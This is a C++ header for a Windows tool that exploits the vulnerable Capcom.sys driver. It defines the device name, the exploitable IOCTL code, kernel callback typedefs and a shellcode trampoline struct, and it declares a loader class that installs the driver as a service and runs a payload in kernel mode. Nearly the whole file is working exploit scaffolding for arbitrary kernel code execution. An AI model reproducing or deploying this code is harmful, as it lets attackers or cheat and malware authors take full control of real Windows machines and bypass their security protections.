#pragma once
#include "stdafx.h"

using namespace std;

/// Name of the service, as exposed to the 
#define SERVICE_NAME L"Hmmmm"

/// The name of the device that the capcom driver exposes to usermode. Does not change.
#define CAPCOM_DEVICE_NAME L"\\\\.\\Htsysm72FB"

/// The exploitable IOCTL that, when called on the capcom device above, will trigger the payload
#define CAPCOM_DEVICE_IOCTL64 0xAA013044

/// MMGetSystemRoutine is the GetProcAddress of the kernel. Capcom.sys passes us the address
/// of this function as the first argument
typedef PVOID(NTAPI *MMGETSYSTEMROUTINEADDRFUNC)(PUNICODE_STRING SystemRoutineName);

/// Driver calls function passing the address of MmGetSystemRoutineAddress as the first argument
/// No kernel leak required
typedef PVOID (NTAPI *CAPCOM_USER_FUNC)(MMGETSYSTEMROUTINEADDRFUNC _MmGetSystemRoutineAddress);

/// Defines a static UNICODE_STRING
#define DECLARE_UNICODE_STRING(_var, _string) \
	WCHAR _var ## _buffer[] = _string; \
	__pragma(warning(push)) \
	__pragma(warning(disable:4221)) __pragma(warning(disable:4204)) \
	UNICODE_STRING _var = { sizeof(_string)-sizeof(WCHAR), sizeof(_string), (PWCH)_var ## _buffer } \
	__pragma(warning(pop))

// Struct idea from:
// https://github.com/tandasat/ExploitCapcom/blob/master/ExploitCapcom/ExploitCapcom/ExploitCapcom.cpp

#include <pshpack1.h>
/// Trampoline to the actual shellcode. Uses 'sti' to re-enable interrupts to prevent BSOD on pagefault.
/// Because interrupts are enabled, our shellcode has to be real quick or else the scheduler will switch
/// out to a different thread and our actual payload will be paged out.
typedef struct _PAYLOADTRAMP
{
	// sti; jmp qword [PayloadTarget]
	BYTE TrampAsm[7];

	PVOID PayloadTarget;
} PAYLOADTRAMP, *PPAYLOADTRAMP;
#include <poppack.h>

/// Pointer to the executable page containing the shellcode.
/// This is the only real good way to initialize the bytes of the trampoline with C syntax
typedef struct _TRAMPPAGE
{
	/// This is just a weird quirk with the driver. The driver checks to ensure that [TrampData-8] == TrampAddr... okay sure
	PPAYLOADTRAMP TrampAddr;
	PAYLOADTRAMP TrampData;
} TRAMPPAGE, *PTRAMPPAGE;

class DriverLoader
{
public:
	DriverLoader();

	/// Loads the capcom driver in a new service
	void LoadCapcomService();

	/// Executes the payload using the vulnerable Capcom.sys driver
	void ExecIoCtlWithTrampoline(CAPCOM_USER_FUNC targetFunc);

private:

	/// Returns the location of the driver relative to the current directory
	wstring GetCapcomDriverPath();

	/// Generates a payload which executes the target function
	PPAYLOADTRAMP AllocPayloadTrampoline(CAPCOM_USER_FUNC targetFunc);
};
